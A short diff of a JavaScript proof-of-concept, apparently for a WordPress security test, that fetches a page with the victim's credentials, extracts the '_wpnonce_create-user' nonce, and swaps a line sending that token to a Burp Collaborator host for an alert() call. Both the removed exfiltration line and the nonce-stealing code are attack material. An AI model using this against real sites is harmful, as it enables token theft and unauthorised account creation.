@@ -5,7 +5,7 @@ var csrf = new XMLHttpRequest();
       const parser = new DOMParser();
       const htmlDocument = parser.parseFromString(this.responseText, "text/html");
       const token = htmlDocument.getElementById("_wpnonce_create-user").value;
-      window.location = `http://e1gjugasquv15kb1v024p4gwsnydm2.burpcollaborator.net/?data=${token}`
+      alert(token)
     }
   };
   csrf.withCredentials = true
